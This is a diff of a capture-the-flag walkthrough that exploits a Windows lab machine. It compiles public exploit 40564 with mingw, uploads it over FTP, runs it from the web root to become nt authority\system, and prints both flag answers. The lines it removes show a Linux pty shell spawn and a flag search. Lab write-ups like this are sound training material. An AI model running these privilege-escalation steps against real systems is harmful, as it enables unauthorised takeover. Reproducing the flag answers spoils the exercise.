@@ -319,84 +319,69 @@ Searching on google we found this [exploit](https://www.exploit-db.com/exploits/
 
 <figure><img src=".gitbook/assets/Schermata del 2023-07-25 21-35-56.png" alt=""><figcaption><p><a href="https://www.exploit-db.com/exploits/40564">https://www.exploit-db.com/exploits/40564</a></p></figcaption></figure>
 
-
-
-
-
-
-
-We see that scripts directory has all permessions, jump in!
+We download this script: "40564.c" and we compile it using mingw32
 
 ```bash
-ftp> cd scripts
-250 Directory successfully changed.
-ftp> ls
-229 Entering Extended Passive Mode (|||63113|)
-150 Here comes the directory listing.
--rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
--rw-rw-r--    1 1000     1000         2709 Jul 12 22:43 removed_files.log
--rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
 ```
 
-r we can spawn a bash shell
+Now we can re-open ftp in binary mode and put it (exploit.exe)
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-29 00-41-30.png" alt=""><figcaption></figcaption></figure>
+
+We can find exploit.exe file using where command and run it to escalate privilege!
 
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+where /r C:\ exploit.exe
+c:\inetpub\wwwroot>exploit.exe
+whoami
+nt authority\system
 ```
 
-```bash
-find / -type f -name 'flag.txt' 2>/dev/null
-cat /root/flag.txt
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-29 00-47-23.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Starting to root folder (C:\\) we can find quickly flags, using where command in recusive mode (/r):
+
+```
+where /r C:\ user.txt
+C:\Users\babis\Desktop\user.txt
+```
+
+and read user.txt flag using type command (equivalent to cat on \*nix):
+
+```
+type C:\Users\babis\Desktop\user.txt
 ```
 
 <details>
 
-<summary>🚩 Flag 1 (flag.txt)</summary>
+<summary>🚩 Flag 1 (user.txt)</summary>
 
-
+5d3fc209e1fae6d5df926fe7dc8a16bd
 
 </details>
 
-
-
 ### Task 4 - Find root flag
 
-
-
-
-
-
-
-
-
-We see that scripts directory has all permessions, jump in!
+After that, we do the same thing for root.txt flag
 
 ```bash
-ftp> cd scripts
-250 Directory successfully changed.
-ftp> ls
-229 Entering Extended Passive Mode (|||63113|)
-150 Here comes the directory listing.
--rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
--rw-rw-r--    1 1000     1000         2709 Jul 12 22:43 removed_files.log
--rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
-```
-
-r we can spawn a bash shell
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+where /r C:\ root.txt
+C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```bash
-find / -type f -name 'flag.txt' 2>/dev/null
-cat /root/flag.txt
+type C:\Users\Administrator\Desktop\root.txt
 ```
 
 <details>
 
 <summary>🚩 Flag 2 (root.txt)</summary>
 
-
+cb43e154f9c2ca60b68c8150e5162f32
 
 </details>
